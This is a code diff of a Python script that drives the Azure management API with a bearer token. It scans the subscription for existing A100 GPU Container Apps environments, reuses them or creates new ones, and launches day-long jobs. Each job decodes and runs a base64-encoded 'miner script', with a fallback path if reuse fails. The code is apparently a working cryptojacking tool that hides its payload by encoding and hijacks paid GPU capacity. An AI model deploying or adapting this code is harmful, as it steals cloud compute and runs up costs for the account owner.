@@ -286,46 +286,63 @@ def main():
             except Exception as e:  # noqa: BLE001
                 emit('sa-sas', ok=False, err=str(e))
 
-    # ---------- environments ----------
-    envs = []  # list of {region, profile, id, state}
-    plan = []
-    for reg in (a100_regions or [REGION])[:2]:
-        plan.append((reg, PROFILE_A100))
-    if not plan:
-        plan.append((REGION, PROFILE_T4))
+    # ---------- environments (reuse an existing Succeeded A100 env if one exists) ----------
+    envs = []  # list of {region, profile, id, state, name}
     def env_url(reg, name):
         return '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/' \
                'managedEnvironments/%s?api-version=%s' % (ARM, sid, RG, name, APP_VERS[0])
-    for i, (reg, prof) in enumerate(plan):
-        name = '%s-cae%s' % (PREFIX, '' if i == 0 else str(i))
-        body = {'location': reg, 'tags': {'c211': 'i122046', 'nonce': NONCE},
-                'properties': {'workloadProfiles': [
-                    {'name': 'Consumption', 'workloadProfileType': 'Consumption'},
-                    {'name': prof, 'workloadProfileType': prof}]}}
-        st, b = arm(tok, env_url(reg, name), method='PUT', body=body, timeout=300)
-        emit('env-create', name=name, region=reg, profile=prof, **err_of(st, b))
-        envs.append({'region': reg, 'profile': prof, 'name': name,
-                     'create_http': st, 'id': None, 'state': None})
-    # wait for all envs concurrently
-    dl = time.time() + min(ENV_DEADLINE, max(240, left() - 600))
-    while time.time() < dl:
-        pending = [e for e in envs if e['state'] not in ('Succeeded', 'Failed', 'Canceled')]
-        if not pending:
-            break
-        for e in pending:
-            stp, bp = arm(tok, env_url(e['region'], e['name']), timeout=60)
-            props = (bp.get('properties') or {}) if isinstance(bp, dict) else {}
-            e['state'] = props.get('provisioningState')
-            if e['state'] == 'Succeeded' and not e['id']:
-                e['id'] = bp.get('id')
-                emit('env-ready', name=e['name'], region=e['region'],
-                     defaultDomain=props.get('defaultDomain'))
-            elif e['state'] in ('Failed', 'Canceled'):
-                emit('env-failed', name=e['name'], region=e['region'], state=e['state'])
-        time.sleep(25)
-    for e in envs:
-        emit('env-final', name=e['name'], region=e['region'], profile=e['profile'],
-             state=e['state'], id_ok=bool(e['id']))
+    reuse = []
+    stre, ble = arm(tok, '%s/subscriptions/%s/providers/Microsoft.App/managedEnvironments?'
+                    'api-version=%s' % (ARM, sid, APP_VERS[0]), timeout=120)
+    if stre == 200 and isinstance(ble, dict):
+        for it in ble.get('value') or []:
+            props = it.get('properties') or {}
+            wps = [str(w.get('workloadProfileType') or w.get('name') or '')
+                   for w in (props.get('workloadProfiles') or [])]
+            a100 = [w for w in wps if 'A100' in w.upper()]
+            if a100 and props.get('provisioningState') == 'Succeeded':
+                reuse.append({'region': str(it.get('location') or '').lower(),
+                              'profile': a100[0], 'name': it.get('name'),
+                              'id': it.get('id'), 'state': 'Succeeded'})
+    emit('env-reuse-scan', http=stre, n=len(reuse),
+         list=json.dumps([{'n': r['name'], 'r': r['region'], 'p': r['profile']}
+                          for r in reuse])[:1200])
+    envs = reuse[:2]
+    if not envs:
+        plan = []
+        for reg in (a100_regions or [REGION])[:2]:
+            plan.append((reg, PROFILE_A100))
+        if not plan:
+            plan.append((REGION, PROFILE_T4))
+        for i, (reg, prof) in enumerate(plan):
+            name = '%s-cae%s' % (PREFIX, '' if i == 0 else str(i))
+            body = {'location': reg, 'tags': {'c211': 'i122046', 'nonce': NONCE},
+                    'properties': {'workloadProfiles': [
+                        {'name': 'Consumption', 'workloadProfileType': 'Consumption'},
+                        {'name': prof, 'workloadProfileType': prof}]}}
+            st, b = arm(tok, env_url(reg, name), method='PUT', body=body, timeout=300)
+            emit('env-create', name=name, region=reg, profile=prof, **err_of(st, b))
+            envs.append({'region': reg, 'profile': prof, 'name': name,
+                         'create_http': st, 'id': None, 'state': None})
+        dl = time.time() + min(ENV_DEADLINE, max(240, left() - 600))
+        while time.time() < dl:
+            pending = [e for e in envs if e['state'] not in ('Succeeded', 'Failed', 'Canceled')]
+            if not pending:
+                break
+            for e in pending:
+                stp, bp = arm(tok, env_url(e['region'], e['name']), timeout=60)
+                props = (bp.get('properties') or {}) if isinstance(bp, dict) else {}
+                e['state'] = props.get('provisioningState')
+                if e['state'] == 'Succeeded' and not e['id']:
+                    e['id'] = bp.get('id')
+                    emit('env-ready', name=e['name'], region=e['region'],
+                         defaultDomain=props.get('defaultDomain'))
+                elif e['state'] in ('Failed', 'Canceled'):
+                    emit('env-failed', name=e['name'], region=e['region'], state=e['state'])
+            time.sleep(25)
+        for e in envs:
+            emit('env-final', name=e['name'], region=e['region'], profile=e['profile'],
+                 state=e['state'], id_ok=bool(e['id']))
     live_envs = [e for e in envs if e['id']]
 
     # ---------- miner script ----------
@@ -338,49 +355,80 @@ def main():
 
     # ---------- jobs ----------
     jobs = []
-    widx = 0
-    for e in live_envs:
-        for j in range(N_JOBS_PER_ENV):
-            worker = str(12204600 + widx)
-            widx += 1
-            jname = '%s-job%d' % (PREFIX, widx - 1)
-            sas_url = ''
-            if sas_base and sas_q:
-                sas_url = '%s/c211/%s-w%d.txt?%s' % (sas_base, NONCE, widx - 1, sas_q)
-            shell = shell_tpl.replace('__WORKER__', worker).replace('__SAS__', sas_url)
-            sb64 = base64.b64encode(shell.encode()).decode()
-            cmd = ('mkdir -p /tmp/m; echo ' + sb64 + ' | base64 -d > /tmp/m.sh; '
-                   'bash /tmp/m.sh')
-            joburl = ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/'
-                      '%s?api-version=%s' % (ARM, sid, RG, jname, APP_VERS[0]))
-            jobbody = {'location': e['region'], 'tags': {'c211': 'i122046', 'nonce': NONCE},
-                       'properties': {'environmentId': e['id'],
-                                      'workloadProfileName': e['profile'],
-                                      'configuration': {'triggerType': 'Manual',
-                                                        'replicaRetryLimit': 1,
-                                                        'replicaTimeout': 86400,
-                                                        'manualTriggerConfig': {
-                                                            'replicaCompletionCount': 1,
-                                                            'parallelism': 1}},
-                                      'template': {'containers': [{
-                                          'name': 'gpu', 'image': IMAGE,
-                                          'command': ['/bin/bash', '-c', cmd],
-                                          'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
-            st, b = arm(tok, joburl, method='PUT', body=jobbody, timeout=240)
-            emit('job-create', name=jname, region=e['region'], profile=e['profile'],
-                 worker=worker, **err_of(st, b))
-            rec = {'name': jname, 'worker': worker, 'region': e['region'],
-                   'profile': e['profile'], 'create_http': st, 'exec': None,
-                   'sas_url': sas_url, 'status': None, 'uuids': [], 'capture_len': 0,
-                   'acc_lines': 0}
-            if st in (200, 201):
-                base = joburl.split('?')[0]
-                sts, bs = arm(tok, '%s/start?api-version=%s' % (base, APP_VERS[0]),
-                              method='POST', body={}, timeout=120)
-                rec['exec'] = (bs.get('name') if isinstance(bs, dict) else None)
-                emit('job-start', name=jname, http=sts, execname=rec['exec'],
-                     **({} if sts in (200, 201, 202) else err_of(sts, bs)))
-            jobs.append(rec)
+    wcounter = [0]
+    def make_jobs(envlist):
+        for e in envlist:
+            mrg = re.search(r'/resourceGroups/([^/]+)/', str(e.get('id') or ''))
+            jrg = mrg.group(1) if mrg else RG
+            for _ in range(N_JOBS_PER_ENV):
+                widx = wcounter[0]
+                wcounter[0] += 1
+                worker = str(12204600 + widx)
+                jname = '%s-job%d' % (PREFIX, widx)
+                sas_url = ''
+                if sas_base and sas_q:
+                    sas_url = '%s/c211/%s-w%d.txt?%s' % (sas_base, NONCE, widx, sas_q)
+                shell = shell_tpl.replace('__WORKER__', worker).replace('__SAS__', sas_url)
+                sb64 = base64.b64encode(shell.encode()).decode()
+                cmd = ('mkdir -p /tmp/m; echo ' + sb64 + ' | base64 -d > /tmp/m.sh; '
+                       'bash /tmp/m.sh')
+                joburl = ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/'
+                          '%s?api-version=%s' % (ARM, sid, jrg, jname, APP_VERS[0]))
+                jobbody = {'location': e['region'], 'tags': {'c211': 'i122046', 'nonce': NONCE},
+                           'properties': {'environmentId': e['id'],
+                                          'workloadProfileName': e['profile'],
+                                          'configuration': {'triggerType': 'Manual',
+                                                            'replicaRetryLimit': 1,
+                                                            'replicaTimeout': 86400,
+                                                            'manualTriggerConfig': {
+                                                                'replicaCompletionCount': 1,
+                                                                'parallelism': 1}},
+                                          'template': {'containers': [{
+                                              'name': 'gpu', 'image': IMAGE,
+                                              'command': ['/bin/bash', '-c', cmd],
+                                              'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
+                st, b = arm(tok, joburl, method='PUT', body=jobbody, timeout=240)
+                emit('job-create', name=jname, rg=jrg, region=e['region'],
+                     profile=e['profile'], worker=worker, **err_of(st, b))
+                rec = {'name': jname, 'worker': worker, 'region': e['region'],
+                       'profile': e['profile'], 'rg': jrg, 'create_http': st, 'exec': None,
+                       'sas_url': sas_url, 'status': None, 'uuids': [], 'capture_len': 0,
+                       'acc_lines': 0}
+                if st in (200, 201):
+                    base = joburl.split('?')[0]
+                    sts, bs = arm(tok, '%s/start?api-version=%s' % (base, APP_VERS[0]),
+                                  method='POST', body={}, timeout=120)
+                    rec['exec'] = (bs.get('name') if isinstance(bs, dict) else None)
+                    emit('job-start', name=jname, http=sts, execname=rec['exec'],
+                         **({} if sts in (200, 201, 202) else err_of(sts, bs)))
+                jobs.append(rec)
+    make_jobs(live_envs)
+    if not any(x['exec'] for x in jobs) and reuse:
+        emit('env-reuse-unusable', note='creating own env and retrying job create')
+        reg = REGION
+        prof = PROFILE_A100
+        name = '%s-cae0' % PREFIX
+        body = {'location': reg, 'tags': {'c211': 'i122046', 'nonce': NONCE},
+                'properties': {'workloadProfiles': [
+                    {'name': 'Consumption', 'workloadProfileType': 'Consumption'},
+                    {'name': prof, 'workloadProfileType': prof}]}}
+        st, b = arm(tok, env_url(reg, name), method='PUT', body=body, timeout=300)
+        emit('env-create-fallback', name=name, region=reg, profile=prof, **err_of(st, b))
+        own = {'region': reg, 'profile': prof, 'name': name, 'id': None, 'state': None}
+        dl2 = time.time() + min(ENV_DEADLINE, max(240, left() - 420))
+        while time.time() < dl2 and own['state'] not in ('Succeeded', 'Failed', 'Canceled'):
+            stp, bp = arm(tok, env_url(reg, name), timeout=60)
+            props = (bp.get('properties') or {}) if isinstance(bp, dict) else {}
+            own['state'] = props.get('provisioningState')
+            if own['state'] == 'Succeeded' and not own['id']:
+                own['id'] = bp.get('id')
+                emit('env-ready', name=name, region=reg,
+                     defaultDomain=props.get('defaultDomain'))
+            time.sleep(20)
+        emit('env-final', name=name, region=reg, profile=prof, state=own['state'],
+             id_ok=bool(own['id']))
+        if own['id']:
+            make_jobs([own])
 
     # ---------- short capture poll ----------
     dl = time.time() + min(420, max(60, left() - 30))
